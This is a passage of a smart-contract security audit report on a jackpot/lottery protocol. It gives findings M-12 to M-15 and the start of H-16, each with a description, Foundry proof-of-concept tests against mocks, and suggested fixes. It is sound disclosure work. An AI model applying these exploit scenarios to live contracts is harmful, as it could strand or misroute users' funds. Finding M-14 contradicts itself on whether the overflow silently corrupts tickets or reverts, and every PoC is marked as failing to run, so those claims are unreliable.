        // Old provider A fulfills sequence 1 => pending[1] has been overwritten by C2; C2 gets called
        entropy.reveal(providerA, 1, bytes32(uint256(123)));
        assertTrue(c2.called(), "C2 not called");
        assertEq(c2.calledSeq(), 1, "C2 wrong seq");
        assertFalse(c1.called(), "C1 should not be called");

        // New provider B fulfills its sequence 1 => UnknownSequence revert (pending[1] was deleted by prior fulfill)
        vm.expectRevert(ScaledEntropyProvider.UnknownSequence.selector);
        entropy.revealBubble(providerB, 1, bytes32(uint256(456)));
    }
}


## Suggested Mitigation
- Key pending requests by provider and sequence, e.g., mapping(address => mapping(uint64 => PendingRequest)) or mapping(bytes32 => PendingRequest) keyed by keccak256(abi.encode(provider, sequence)).
- Store and verify the provider with each request, and in entropyCallback use the provider argument to look up the pending entry; revert if it does not match.
- Optionally gate setEntropyProvider() while there are outstanding requests (track a pending count), or introduce an epoch and include it in the key (keccak256(abi.encode(epoch, provider, sequence))).
- If you retain any single-key storage writes, ensure you clear or replace arrays rather than appending over pre-existing storage to avoid stale data in setRequests.





 **Derived From** : Sequence-only pending key + ignored provider lets provider rotation hijack callbacks

## [M-12]. Provider rotation overwrites pending[sequence], misroutes randomness and bricks prior request via UnknownSequence

### Finding Severity Justification: Rotating the entropy provider while a prior request is pending can overwrite pending[sequence] because requests are keyed only by sequence and the callback ignores the provider address. Since Pyth Entropy V2 sequence numbers are provider-local, this enables misrouting of the first callback and then bricking the second via UnknownSequence(). Impact is a realistic functional DoS: a drawing can be permanently stuck and entropy fees wasted, but there is no direct theft of funds. This fits Code4rena Medium: protocol availability and correctness are impaired without direct asset loss.
## Derived From Pattern/Invariant
Sequence-only pending key + ignored provider lets provider rotation hijack callbacks

## Exploit Type
AccountingInvariantViolation

## Location
ScaledEntropyProvider.entropyCallback

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
ScaledEntropyProvider keys pending requests only by sequence and ignores the provider argument on callback. Pyth Entropy V2 sequences are provider-local, so rotating to a new provider while old requests are still pending can collide on the same sequence. The later request overwrites pending[sequence]; when the earlier provider’s callback arrives first, entropyCallback() processes it using the overwritten setRequests/context and deletes pending[sequence]. The legitimate later callback for the new provider then reverts UnknownSequence(), permanently failing that request. Vulnerable snippets:
- mapping(uint64 => PendingRequest) private pending;
- function entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber) internal override { PendingRequest memory req = pending[sequence]; if (req.callback == address(0)) revert UnknownSequence(); delete pending[sequence]; ... }
- function setEntropyProvider(address _entropyProvider) external onlyOwner { ... entropyProvider = _entropyProvider; }

## Impact
Functional DoS and accounting mismatch: one of two in-flight entropy requests is lost (permanent UnknownSequence), and the other may be delivered using the wrong setRequests/context. This can lock a drawing, burn entropy fees without result, and break the 1:1 request→callback invariant.

## Command to Run Test


## Proof of Concept
1) Deploy ScaledEntropyProvider with provider A; make request #1 (sequence=1 for A).
2) Owner rotates to provider B; make request #2 (sequence=1 for B) which overwrites pending[1].
3) Entropy callback for provider A, seq=1 arrives first → processed with request #2’s setRequests/context; pending[1] deleted.
4) Entropy callback for provider B, seq=1 arrives later → reverts UnknownSequence(). Result: request #1 is misrouted; request #2 is bricked; one drawing can be stuck.

## Proof of Code
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
import {ScaledEntropyProvider} from "contracts/ScaledEntropyProvider.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";

contract MockEntropy {
    mapping(address => uint64) public seq;
    function requestV2(address provider, uint32 /*gasLimit*/) external payable returns (uint64 assignedSequenceNumber) {
        uint64 s = seq[provider] + 1;
        seq[provider] = s;
        return s; // provider-local sequence starting at 1
    }
    function getFeeV2(address /*provider*/, uint32 /*gasLimit*/) external pure returns (uint128) {
        return 0; // free for test
    }
}

contract MockConsumer {
    ScaledEntropyProvider public provider;
    uint64 public lastSequence;
    bytes public lastContext;
    uint256 public deliveredCount;

    constructor(ScaledEntropyProvider _provider) { provider = _provider; }

    function req(uint32 gasLimit, IScaledEntropyProvider.SetRequest[] memory requests, bytes memory ctx) external returns (uint64) {
        return provider.requestAndCallbackScaledRandomness(gasLimit, requests, this.onRandom.selector, ctx);
    }

    function onRandom(uint64 sequence, uint256[][] memory /*nums*/, bytes memory ctx) external {
        lastSequence = sequence;
        lastContext = ctx;
        deliveredCount++;
    }
}

contract ProviderRotationSequenceCollisionTest is Test {
    ScaledEntropyProvider sp;
    MockEntropy entropy;
    MockConsumer consumer;
    address providerA = address(0xA11CE);
    address providerB = address(0xB0B);

    function setUp() public {
        entropy = new MockEntropy();
        sp = new ScaledEntropyProvider(address(entropy), providerA);
        consumer = new MockConsumer(sp);
    }

    function _mkReq(uint8 samples, uint256 minR, uint256 maxR, bool withRep) internal pure returns (IScaledEntropyProvider.SetRequest[] memory r) {
        r = new IScaledEntropyProvider.SetRequest[](1);
        r[0] = IScaledEntropyProvider.SetRequest({samples: samples, minRange: minR, maxRange: maxR, withReplacement: withRep});
    }

    function test_providerRotation_overwrite_misroute_and_brick() public {
        // Request #1 via provider A (sequence=1 for A)
        uint64 s1 = consumer.req(200_000, _mkReq(1, 1, 10, true), bytes("ctx1"));
        assertEq(s1, 1);

        // Rotate to provider B
        sp.setEntropyProvider(providerB);

        // Request #2 via provider B (sequence=1 for B) -> overwrites pending[1]
        uint64 s2 = consumer.req(200_000, _mkReq(1, 1, 20, true), bytes("ctx2"));
        assertEq(s2, 1);

        // Callback from provider A first: handled using overwritten entry (#2), then deletes pending[1]
        vm.prank(address(entropy));
        sp._entropyCallback(1, providerA, keccak256("rndA"));
        assertEq(consumer.deliveredCount(), 1);
        assertEq(consumer.lastSequence(), 1);
        assertEq(keccak256(consumer.lastContext()), keccak256(bytes("ctx2"))); // misrouted to ctx2

        // Later callback from provider B for the actual #2 -> reverts UnknownSequence()
        vm.expectRevert(ScaledEntropyProvider.UnknownSequence.selector);
        vm.prank(address(entropy));
        sp._entropyCallback(1, providerB, keccak256("rndB"));
    }
}


## Suggested Mitigation
- Key pending requests by (provider, sequence) or store the provider inside PendingRequest and validate in entropyCallback that the passed provider matches the stored one.
- Alternatively, forbid provider rotation while any pending requests exist (track a counter) or maintain separate namespaces per provider and only clean up the matching entry.





 **Derived From** : Mid-drawing payout-calculator swap zeroes all tier payouts due to missing snapshot guard

## [M-13]. GuaranteedMinimumPayoutCalculator can settle with uninitialized snapshot after mid-drawing swap, zeroing all tier payouts

### Finding Severity Justification: Swapping to a fresh payout calculator mid-drawing causes the current drawing to be settled against an uninitialized snapshot, resulting in all tier payouts being zero and winners receiving nothing. While this requires an owner action, the contract/docs state the change "affects future payout calculations," creating a realistic footgun where an owner following expected usage could inadvertently brick a drawing’s payouts. Per Code4rena caveat, accidental bricking via valid admin flow merits Medium.
## Derived From Pattern/Invariant
Mid-drawing payout-calculator swap zeroes all tier payouts due to missing snapshot guard

## Exploit Type
UpgradeabilityInitializerSafety

## Location
GuaranteedMinimumPayoutCalculator.calculateAndStoreDrawingUserWinnings

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
GuaranteedMinimumPayoutCalculator.calculateAndStoreDrawingUserWinnings() assumes drawingTierInfo[_drawingId] has been snapshotted via setDrawingTierInfo(). If Jackpot.owner switches payoutCalculator to a fresh instance mid-drawing, the new calculator has no snapshot for the active drawing. The function then reads a default-zero DrawingTierInfo and short-circuits every tier as if ineligible: tierInfo.minPayoutTiers[i] == false and tierInfo.premiumTierWeights[i] == 0, so it executes:

DrawingTierInfo storage tierInfo = drawingTierInfo[_drawingId];
...
if (!tierInfo.minPayoutTiers[i] && tierInfo.premiumTierWeights[i] == 0) {
    tierWinners[i] = 0;
    continue;
}

This yields tierWinners = 0 for all tiers, minimumPayoutAllocation = 0, and _calculateAndStoreTierPayouts() never stores payouts; totalPayout returns 0. As a result, all winners for that drawing receive 0 and getTierPayout(_drawingId, tierId) returns 0. No guard verifies the snapshot exists (e.g., that weight sum == PRECISE_UNIT).

## Impact
If the owner swaps to a fresh payout calculator mid‑drawing, the settlement for that drawing runs against an all‑zero snapshot on the new calculator. This results in tier payouts not being stored and total user winnings computed as 0. Practically, all winners for that drawing receive 0 and can never claim later since getTierPayout(drawingId, tierId) stays 0. In addition, Jackpot will treat userWinnings=0 at settlement, crediting the entire prize pool to LP value (and potentially charging protocol fees), misallocating funds away from winners.

## Command to Run Test


## Proof of Concept
1) Drawing N is active. Jackpot has already called oldCalc.setDrawingTierInfo(N) at new-drawing init time.
2) Owner calls Jackpot.setPayoutCalculator(newCalc) mid-drawing.
3) newCalc has no drawingTierInfo[N] snapshot. When Jackpot settles drawing N, it calls newCalc.calculateAndStoreDrawingUserWinnings(N,...).
4) Because tierInfo is all-zero, every tier is treated as having no eligible payout path; function returns totalPayout = 0 and stores no tier payouts.
5) Users claiming winnings for drawing N read getTierPayout(N, tierId) == 0, receiving nothing.

## Proof of Code
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
import {GuaranteedMinimumPayoutCalculator} from "contracts/GuaranteedMinimumPayoutCalculator.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";

contract PayoutCalcInitOrderTest is Test {
    address jackpot = address(0xA11CE);

    function _deployCalc() internal returns (GuaranteedMinimumPayoutCalculator) {
        bool[12] memory minTiers;
        minTiers[11] = true; // only jackpot tier has min payout eligibility
        uint256[12] memory weights;
        weights[11] = 1e18;  // all premium weight to jackpot tier
        return new GuaranteedMinimumPayoutCalculator(
            IJackpot(jackpot),
            1e6,    // minimumPayout = 1 USDC (6 decimals)
            0,      // premiumTierMinAllocation
            minTiers,
            weights
        );
    }

    function test_midDrawingSwapToFreshCalcZeroesPayouts() public {
        GuaranteedMinimumPayoutCalculator calc1 = _deployCalc();
        GuaranteedMinimumPayoutCalculator calc2 = _deployCalc(); // fresh calc with empty snapshot mapping

        uint256 drawingId = 1;
        // At drawing init, Jackpot would snapshot on the then-current calculator (calc1)
        vm.prank(jackpot);
        calc1.setDrawingTierInfo(drawingId);

        uint256 prizePool = 100e6; // 100 USDC
        uint8 normalMax = 10;
        uint8 bonusballMax = 10;

        uint256[] memory uniqueResult = new uint256[](12);
        uint256[] memory dupResult = new uint256[](12);
        uniqueResult[11] = 1; // one jackpot winner (5 normals + bonusball)

        // Sanity: with proper snapshot, full pool goes to the single jackpot winner
        vm.prank(jackpot);
        uint256 expected = calc1.calculateAndStoreDrawingUserWinnings(
            drawingId, prizePool, normalMax, bonusballMax, uniqueResult, dupResult
        );
        assertEq(expected, prizePool, "snapshot calc pays full pool to single jackpot winner");

        // Simulate mid-drawing swap: Jackpot now calls into a fresh calculator without snapshot
        vm.prank(jackpot);
        uint256 zeroed = calc2.calculateAndStoreDrawingUserWinnings(
            drawingId, prizePool, normalMax, bonusballMax, uniqueResult, dupResult
        );
        assertEq(zeroed, 0, "fresh calc without snapshot returns zero total payout");
        assertEq(calc2.getTierPayout(drawingId, 11), 0, "tier payout not stored -> winners rugged");
    }
}

## Suggested Mitigation
Best fix: bind each drawing to the calculator that took its snapshot and use that instance for settlement. For example:
- In Jackpot._setNewDrawingState(), after calling payoutCalculator.setDrawingTierInfo(currentDrawingId), store payoutCalculatorForDrawing[currentDrawingId] = payoutCalculator.
- In scaledEntropyCallback(), call payoutCalculatorForDrawing[currentDrawingId].calculateAndStoreDrawingUserWinnings(...) instead of the mutable payoutCalculator variable. Optionally, expose a view to read this mapping for transparency.
Operational guard: make setPayoutCalculator() schedule the change for the next drawing only (e.g., set nextPayoutCalculator, and switch current→next exclusively inside _setNewDrawingState()). Revert setPayoutCalculator() if a drawing is active (currentDrawingId initialized and not yet settled), to prevent mid‑drawing swaps.
Defensive check (optional): in GuaranteedMinimumPayoutCalculator.calculateAndStoreDrawingUserWinnings(), assert a snapshot exists before computing by requiring sum(tierInfo.premiumTierWeights) == PRECISE_UNIT. This avoids silent zeroing, but should be combined with the above Jackpot changes; otherwise it could cause settlement to revert and stall progress.





 **Derived From** : Let a = getTicketInfo(tokenId) and b = getExtendedTicketInfo(tokenId). Then b.ticketId == tokenId AND b.ticket.drawingId == a.drawingId AND b.ticket.packedTicket == a.packedTicket AND b.ticket.referralScheme == a.referralScheme AND b.normals.length == 5 AND b.bonusball >= 1

## [M-14]. Bit-packing overflow breaks JackpotTicketNFT.getExtendedTicketInfo: normals length != 5 and bonusball == 0 when normalBallMax + bonusball > 255

### Finding Severity Justification: If normalBallMax + bonusballMax >= 256, TicketComboTracker.insert packs the bonusball with `1 << (bonusball + normalMax)`, which silently becomes 0 for shifts >= 256, corrupting the packed ticket. Consequences: (a) unpackTicket will revert (array bounds during normals fill or underflow on bonusball calc), breaking JackpotTicketNFT.getExtendedTicketInfo and any consumer; (b) more critically, tier computation in claimWinnings misinterprets bonusball as 0 for both ticket and winning numbers, producing incorrect tier IDs and payouts across the drawing. Impact is high if triggered, but reaching the boundary generally requires very large parameters/prize pools; pool-cap logic mitigates typical cases but does not hard-enforce the 255-bit limit, so the issue remains possible.
## Derived From Pattern/Invariant
Let a = getTicketInfo(tokenId) and b = getExtendedTicketInfo(tokenId). Then b.ticketId == tokenId AND b.ticket.drawingId == a.drawingId AND b.ticket.packedTicket == a.packedTicket AND b.ticket.referralScheme == a.referralScheme AND b.normals.length == 5 AND b.bonusball >= 1

## Exploit Type
AccountingInvariantViolation

## Location
JackpotTicketNFT.getExtendedTicketInfo

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Tickets are bit-packed as: normals in bits [1..ballMax], bonusball at bit (ballMax + bonusball). Packing uses `1 << (bonusball + normalMax)` (TicketComboTracker.insert), and unpacking uses `TicketComboTracker.unpackTicket(packed, ballMax)` which builds `normals` with length `popCount(packed) - 1` and derives `bonusball = fls(packed) - ballMax`. There is no guard that enforces `bonusball + normalBallMax <= 255`. When `normalBallMax + bonusball >= 256`, the pack operation `1 << (bonusball + normalBallMax)` becomes a left shift by >=256 and yields 0 in Solidity 0.8+, so the bonusball bit is silently dropped. Consequences: (1) `getExtendedTicketInfo()` returns `normals.length == 4` (popCount=5, minus 1) and `bonusball == 0`, violating the arithmetic invariant that extended info has exactly 5 normals and a positive bonusball; (2) tier computation later treats missing bonusball as a match (both ticket and winning have 0 after `>> (normalBallMax+1)`), causing incorrect tier IDs and mispayout/DoS risks. Root causes: (a) `_setNewDrawingState` computes `bonusballMax` without clamping to `255 - normalBallMax` and casts to `uint8` without bounds checks; (b) packing uses unchecked shifting; (c) unpack assumes exactly one bit above `ballMax` exists.

## Impact
If bonusballMax + normalBallMax exceeds 255, any code path that builds the packed bit for the bonusball (using 1 << (bonus + normalMax)) will revert due to checked uint8 addition overflow before the shift, causing denial of service. Practically: (a) Users can be prevented from buying otherwise “allowed” tickets (bonusball <= bonusballMax) because insert() reverts when bonus + normalMax > 255; (b) More critically, scaledEntropyCallback can permanently fail if the entropy provider returns a winning bonusball > 255 - normalMax, leaving the drawing locked and forcing emergency-mode unwinds. This is a systemic availability failure; it does not silently corrupt tickets.

## Command to Run Test


## Proof of Concept
Precondition: A drawing (or tracker) is configured such that normalBallMax + bonusballMax > 255 (e.g., normalBallMax = 200, bonusballMax = 100). Two effects:
1) Ticket purchase DoS: A buyer selecting a valid bonusball within [1..bonusballMax] that also satisfies bonusball > 255 - normalBallMax will trigger a revert in TicketComboTracker.insert() due to overflow in (bonus + normalMax) before shifting, aborting buyTickets().
2) Settlement DoS: During scaledEntropyCallback, if the winning bonusball sampled by the entropy provider is > 255 - normalBallMax, building the winningTicket will revert for the same reason, bricking the drawing (jackpotLock remains true).
This arises because there is no clamp on newDrawingState.bonusballMax relative to normalBallMax in _setNewDrawingState(), and no downstream guard in _validateAndStoreTickets() against bonusball > 255 - ballMax.

## Proof of Code
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
import {TicketComboTracker} from "contracts/lib/TicketComboTracker.sol";

contract BitFitGuardsTest is Test {
    TicketComboTracker.Tracker tracker;

    function setUp() public {
        // Configure a tracker with params that violate 255-bit packing headroom
        // normalMax + bonusballMax = 200 + 100 = 300 > 255
        TicketComboTracker.init(tracker, 200, 100, 5);
    }

    function test_insertRevertsWhenNormalPlusBonusExceeds255() public {
        uint8[] memory normals = new uint8[](5);
        normals[0] = 1; normals[1] = 2; normals[2] = 3; normals[3] = 4; normals[4] = 5;
        // bonusball within configured bonusballMax, but 200 + 60 = 260 > 255
        uint8 badBonus = 60;
        vm.expectRevert(); // uint8 addition overflow before shift
        TicketComboTracker.insert(tracker, normals, badBonus);
    }
}


## Suggested Mitigation
- Enforce bit-fit at drawing initialization: in _setNewDrawingState, clamp or revert so that newBonusball <= 255 - normalBallMax, e.g.:
  require(uint256(normalBallMax) + uint256(newBonusball) <= 255, "bonusballMax too large for packing");
  newBonusball = uint8(Math.min(newBonusball, 255 - normalBallMax));
- Harden purchase path: in _validateAndStoreTickets, require ticket.bonusball <= 255 - _currentDrawingState.ballMax in addition to existing range checks.
- Defensive decode: optionally add a sanity check in TicketComboTracker.unpackTicket to ensure fls(_packedTicket) > _normalMax and revert otherwise (fail fast on corrupted inputs).
- Governance guardrails: constrain setNormalBallMax to sane bounds (e.g., <= 128 to align with Combinations.choose constraints) and document that bonusballMin must also respect the 255-bit headroom.





 **Derived From** : No-referral winnings credited to current round lpEarnings skews accounting across rounds

## [M-15]. claimWinnings time-shifts “no-referral” referrerShare into arbitrary future round lpEarnings, inflating fees and breaking per-round accounting

### Finding Severity Justification: Referrer share from a winning ticket with no referral is credited to the current round’s lpEarnings at claim time, not to the original winning drawing. This lets claimants time claims to inflate a later round’s (lpEarnings − userWinnings), potentially triggering higher protocol fees and perturbing per-round accounting. Impact targets LP value and protocol fee extraction (not direct theft), fitting Medium per Code4rena: protocol function/value impacted with external conditions (claim timing).
## Derived From Pattern/Invariant
No-referral winnings credited to current round lpEarnings skews accounting across rounds

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot._payReferrersWinnings

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Root cause: Jackpot._payReferrersWinnings credits the referrerShare of a winning ticket without a referral scheme to the current drawing’s lpEarnings instead of the drawing where the ticket won. Code: if (_referralSchemeId == bytes32(0)) { drawingState[currentDrawingId].lpEarnings += referrerShare; }. Because claimWinnings only requires ticket.drawingId < currentDrawingId, a winner can wait and claim in any later round. This shifts revenue that belongs to drawingId into an arbitrary future drawing, violating per-round conservation/binding and inflating (lpEarnings − userWinnings) for the future round, potentially triggering _transferProtocolFee() to charge protocol fees on unrelated funds. It also perturbs next-round parameterization that depends on lpEarnings.
Vulnerable snippet:
function _payReferrersWinnings(bytes32 _referralSchemeId, uint256 _winningAmount, uint256 _referralWinShare) internal returns (uint256) {
    uint256 referrerShare = _winningAmount * _referralWinShare / PRECISE_UNIT;
    if (_referralSchemeId == bytes32(0)) {
        drawingState[currentDrawingId].lpEarnings += referrerShare; // wrong drawing and fee base
        emit LpEarningsUpdated(currentDrawingId, referrerShare);
        return referrerShare;
    }
    ...
}
Combined with claimWinnings allowing late claims across rounds:
if (drawingId >= currentDrawingId) revert JackpotErrors.TicketFromFutureDrawing(); // only needs < currentDrawingId

## Impact
Because no-referral referrerShare is booked into the claim-time round’s lpEarnings, a claimant can shift that amount into any later round. This distorts per-round accounting and lets a claimant strategically inflate (lpEarnings − userWinnings) of a chosen future round to trigger or increase protocol fees, extracting value from LPs. Conversely, claimants could also choose rounds where the inflated base is neutralized by large userWinnings, avoiding fees that would otherwise have been charged. The attacker does not gain funds directly but can grief LPs and perturb fee collection and round parameterization, constituting a Medium-severity economic/accounting manipulation.

## Command to Run Test


## Proof of Concept
Scenario:
1) A user buys a ticket in drawing #1 with no referral scheme. The ticket wins.
2) The user waits until drawing #2 is active and then calls claimWinnings([ticketId]).
3) _payReferrersWinnings() adds the referrerShare (winningAmount * referralWinShare) to drawingState[currentDrawingId=2].lpEarnings instead of drawing #1.
4) When drawing #2 settles, _transferProtocolFee() observes inflated lpEarnings despite userWinnings2 being small/zero, and transfers protocol fees to protocolFeeAddress. This fee would not have been charged without the time-shift, causing LP loss and breaking per-round conservation.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {Jackpot} from "contracts/Jackpot.sol";
import {JackpotLPManager} from "contracts/JackpotLPManager.sol";
import {JackpotTicketNFT} from "contracts/JackpotTicketNFT.sol";
import {IPayoutCalculator} from "contracts/interfaces/IPayoutCalculator.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockUSDC is ERC20 {
    constructor() ERC20("USDC", "USDC") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract MockEntropyProvider is IScaledEntropyProvider {
    uint256[5] public normals;
    uint256 public bonus;
    constructor(uint256[5] memory _normals, uint256 _bonus) { normals = _normals; bonus = _bonus; }
    function requestAndCallbackScaledRandomness(
        uint32,
        SetRequest[] memory,
        bytes4 _selector,
        bytes memory _context
    ) external payable returns (uint64) {
        uint256[][] memory out = new uint256[][](2);
        out[0] = new uint256[](5);
        for (uint256 i; i < 5; i++) out[0][i] = normals[i];
        out[1] = new uint256[](1);
        out[1][0] = bonus;
        (bool ok, ) = msg.sender.call(abi.encodeWithSelector(_selector, bytes32(0), out, _context));
        require(ok, "cb fail");
        return 0;
    }
    function getFee(uint32) external pure returns (uint256) { return 0; }
}

contract MockPayoutCalculator is IPayoutCalculator {
    uint256 public defaultPayout;
    mapping(uint256 => mapping(uint256 => uint256)) public p;
    function setDefault(uint256 v) external { defaultPayout = v; }
    function calculateAndStoreDrawingUserWinnings(
        uint256, uint256, uint8, uint8, uint256[] memory, uint256[] memory
    ) external pure returns (uint256) {
        return 0; // keep userWinnings=0 for simplicity
    }
    function setDrawingTierInfo(uint256) external {}
    function getTierPayout(uint256 _drawingId, uint256 _tierId) external view returns (uint256) {
        uint256 v = p[_drawingId][_tierId];
        return v == 0 ? defaultPayout : v;
    }
}

contract NoReferralCreditTimeShiftTest is Test {
    Jackpot jackpot;
    JackpotLPManager lpMan;
    JackpotTicketNFT nft;
    MockUSDC usdc;
    MockEntropyProvider entropy;
    MockPayoutCalculator payout;

    address deployer = address(this);
    address lp = address(0xBEEF);
    address player = address(0xCAFE);

    uint8 constant NORMAL_MAX = 10;

    function setUp() public {
        jackpot = new Jackpot(
            1,              // drawingDurationInSeconds
            NORMAL_MAX,     // normalBallMax
            1,              // bonusballMin
            5e16,           // lpEdgeTarget = 5%
            1e17,           // reserveRatio = 10%
            0,              // referralFee (purchase)
            5e17,           // referralWinShare = 50%
            2e17,           // protocolFee = 20%
            0,              // protocolFeeThreshold = 0
            1e6,            // ticketPrice = 1 USDC
            3,              // maxReferrers
            100000          // entropyBaseGasLimit
        );
        lpMan = new JackpotLPManager(jackpot);
        nft = new JackpotTicketNFT(jackpot);
        usdc = new MockUSDC();
        uint256[5] memory wins = [uint256(1),2,3,4,5];
        entropy = new MockEntropyProvider(wins, 1);
        payout = new MockPayoutCalculator();
        payout.setDefault(100e6); // every tier pays 100 USDC

        jackpot.initialize(IERC20(address(usdc)), lpMan, nft, IScaledEntropyProvider(address(entropy)), IPayoutCalculator(address(payout)));
        jackpot.initializeLPDeposits(1_000_000_000e6);

        usdc.mint(lp, 1_000_000e6);
        vm.startPrank(lp);
        usdc.approve(address(jackpot), type(uint256).max);
        jackpot.lpDeposit(1000e6); // 1,000 USDC LP deposit
        vm.stopPrank();

        jackpot.initializeJackpot(block.timestamp - 10); // drawing #1 ready

        usdc.mint(player, 1000e6);
        vm.prank(player);
        usdc.approve(address(jackpot), type(uint256).max);
    }

    function test_NoReferralRefShareTimeShiftInflatesNextRoundFees() public {
        // Buy a winning ticket in drawing #1 with no referral scheme
        IJackpot.Ticket[] memory ts = new IJackpot.Ticket[](1);
        uint8[] memory normals = new uint8[](5);
        for (uint8 i = 0; i < 5; i++) normals[i] = i+1; // 1..5
        ts[0] = IJackpot.Ticket({ normals: normals, bonusball: 1 });
        vm.prank(player);
        uint256[] memory ids = jackpot.buyTickets(ts, player, new address[](0), new uint256[](0), bytes32("SRC"));

        // Run drawing #1 -> settles and advances to drawing #2
        jackpot.runJackpot{value: 0}();
        assertEq(jackpot.currentDrawingId(), 2, "advanced to drawing 2");

        // Before claim, lpEarnings in drawing #2 should be 0
        Jackpot.DrawingState memory d2Before = jackpot.getDrawingState(2);
        assertEq(d2Before.lpEarnings, 0, "lpEarnings(2) initially 0");

        // Claim in drawing #2 (time-shift). No referral => referrerShare booked into currentDrawingId (2)
        uint256 winAmount = 100e6;
        uint256 refShare = (winAmount * 5e17) / 1e18; // 50 USDC
        vm.prank(player);
        jackpot.claimWinnings(ids);

        // Verify lpEarnings accrued to drawing #2 (not #1)
        Jackpot.DrawingState memory d2After = jackpot.getDrawingState(2);
        assertEq(d2After.lpEarnings, refShare, "referrerShare credited to drawing 2 lpEarnings");

        // Run drawing #2: with userWinnings2=0, protocol fee is charged on inflated lpEarnings
        uint256 protoBefore = usdc.balanceOf(jackpot.protocolFeeAddress());
        jackpot.runJackpot{value: 0}();
        uint256 protoAfter = usdc.balanceOf(jackpot.protocolFeeAddress());
        uint256 expectedFee = (refShare * 2e17) / 1e18; // 20% of 50 = 10 USDC
        assertEq(protoAfter - protoBefore, expectedFee, "protocol fee charged on shifted funds");
    }
}


## Suggested Mitigation
Do not count the no-referral referrerShare as part of the claim-time round’s lpEarnings (the protocol-fee base). Instead:
- Add a new per-drawing accumulator (e.g., drawingState[currentDrawingId].lpNonFeeCredits) that tracks credits arising from no-referral winnings claims during the round.
- In _payReferrersWinnings, when _referralSchemeId == 0x0, increment lpNonFeeCredits (not lpEarnings).
- In scaledEntropyCallback, compute protocol fees on (lpEarnings − lpNonFeeCredits), clamping at zero if needed, e.g.:
  • uint256 feeBase = currentDrawingState.lpEarnings > currentDrawingState.lpNonFeeCredits ? (currentDrawingState.lpEarnings - currentDrawingState.lpNonFeeCredits) : 0;
  • protocolFeeAmount = _transferProtocolFee(feeBase, drawingUserWinnings).
- Still pass the full value (lpEarnings + lpNonFeeCredits) to LPManager.processDrawingSettlement so LPs receive the economic benefit, but those credits do not distort protocol fee assessment nor any logic derived from lpEarnings.
This preserves LP value, eliminates fee gaming via claim timing, and avoids minting shares to the Jackpot contract or mis-attributing to past drawings. If storage changes are acceptable, also emit a new event (LpNonFeeCreditsUpdated) for transparency.





 **Derived From** : Price desync: BridgeManager charges global ticketPrice, stranding overpayments

## [H-16]. BridgeManager.buyTickets over/undercharges due to desynced global vs per‑drawing ticket price, causing stranded USDC or DoS

### Finding Severity Justification: BridgeManager.buyTickets charges using the global Jackpot.ticketPrice() instead of the per-drawing snapshotted price stored in drawingState[currentDrawingId].ticketPrice. When governance updates ticketPrice mid‑drawing (which is allowed and intended to affect only future drawings), cross‑chain buyers can be overcharged with the surplus USDC becoming permanently stranded in JackpotBridgeManager (no refund/sweep path), or undercharged causing the purchase to revert (DoS). This results in direct user fund loss and service disruption under realistic operational conditions.
## Derived From Pattern/Invariant
Price desync: BridgeManager charges global ticketPrice, stranding overpayments

## Exploit Type
AccountingInvariantViolation

## Location
JackpotBridgeManager.buyTickets

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
JackpotBridgeManager.buyTickets() calculates `ticketCost` using the global Jackpot.ticketPrice(), then pulls that amount from the caller and approves Jackpot. However, Jackpot.buyTickets() charges the snapshotted per‑drawing price stored in `drawingState[currentDrawingId].ticketPrice`. If governance updates the global ticketPrice mid‑drawing (allowed for next drawing), the two prices diverge. Overcharge: global > snapshot. BridgeManager pulls more USDC than Jackpot transfers; the surplus remains stuck in BridgeManager because there is no sweep/refund path. Undercharge: global < snapshot. Jackpot attempts to transfer more than BridgeManager approved/balanced and reverts, DoSing bridge purchases. Vulnerable snippet in BridgeManager:

function buyTickets(...) {
  uint256 ticketPrice = jackpot.ticketPrice();
  uint256 ticketCost = ticketPrice * _tickets.length;
  usdc.safeTransferFrom(msg.sender, address(this), ticketCost);
  usdc.approve(address(jackpot), ticketCost);
  jackpot.buyTickets(...); // charges drawingState[currentDrawingId].ticketPrice
}

## Impact
Users can be overcharged and the excess USDC is permanently stranded in BridgeManager (loss of funds). If global price is lower than the current drawing price, bridge purchases revert, causing a DoS to cross‑chain buyers.

## Command to Run Test


## Proof of Concept
1) Initialize the jackpot and start drawing N.
2) Record snapshot price P_snap = drawingState[currentDrawingId].ticketPrice.
3) Governance updates global Jackpot.ticketPrice to P_global != P_snap.
4a) Overcharge case: P_global > P_snap. A user buys 1 ticket via BridgeManager. BridgeManager pulls P_global from user and approves Jackpot; Jackpot transfers only P_snap. The remaining (P_global - P_snap) stays on BridgeManager.
4b) Undercharge case: P_global < P_snap. User buys 1 ticket via BridgeManager. BridgeManager pulls and approves P_global, but Jackpot tries to transfer P_snap > P_global and the call reverts, DoSing bridge purchases.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Relative imports to local contracts
